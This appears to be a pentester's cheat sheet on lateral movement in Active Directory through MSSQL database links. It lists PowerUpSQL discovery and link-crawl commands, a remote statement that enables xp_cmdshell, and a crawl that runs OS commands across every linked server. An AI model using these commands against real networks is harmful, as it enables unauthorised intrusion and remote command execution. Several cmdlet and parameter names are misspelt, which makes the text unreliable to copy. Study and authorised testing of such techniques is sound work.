# AD - MSSQL

## MSSQL Server - Data

### Description

* SQL Servers provide very good options for laterla movement as domain users can be mapped to databse roles
* Database Links allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources
* In case of databse Links between SQL Servers => linked SQL Servers - it is possible to execute stored procedures
* Database links work even accros forest trusts

### Requirement

* SPN and active SQL Server
* Executing Commands: Target server should have xp\_cmdshell or rpcout (disabled by default)
  * If rpcout is enalbed, you can enable xp\_cmdshell using\
    EXECUTE('sp\_configure "xp\_cmdshell",1;reconfigure;') AT "link-name"

### Tool

* PowerUpSQL [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

**Discovery (SPN Scanning)**

```powershell
Get-SQLInstanceDomain

//Gets all SPNs which start with MSSQL - maybe no SQL Server is running (anymore)
```

**Check Accessibility**

```powershell
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
```

**Gather Informatione**

```powershell
Get-SqlInstnaceDomain | Get-SQLServerInfor -verbose
```

**Search for database Links**

```powershell
Get-SQLServerLink -Instnace hostname_of_mssql_server -verbose
Get-SQLServerLinkCrawl -Instnace hostname_of_mssql_server -verbose

-or-

select * from master..sysservers 
//do it in HeidiSQL Portable / Hostname of mssqlserver & Windows Auth
```

**Enumerating DB Links manually**

{% code overflow="wrap" %}
```sql
select * from openquery("nextHost",'select * from master.sysservers')
select * from openquery(""nextHost",'select * from openquery("nexNextHost","select * from master.sysservers")')
```
{% endcode %}

**Executing commands**

{% code overflow="wrap" %}
```powershell
Get-SQLServerLinkCrawl -instance mssqlhostname -query "exec master..xp_cmdshell 'whoami'"
//this runs accross all links
```
{% endcode %}

d
